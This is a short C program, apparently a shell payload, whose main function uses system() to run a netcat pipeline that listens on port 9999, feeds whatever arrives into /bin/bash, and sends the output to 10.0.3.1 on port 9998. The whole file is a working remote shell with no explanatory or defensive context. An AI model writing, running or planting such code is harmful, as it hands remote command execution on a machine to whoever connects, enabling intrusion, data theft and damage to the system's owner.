#include <string.h>
#include <stdlib.h>

int main(){
	system("nc -lnvp 9999 | /bin/bash | nc 10.0.3.1 9998");
	return 0;
}
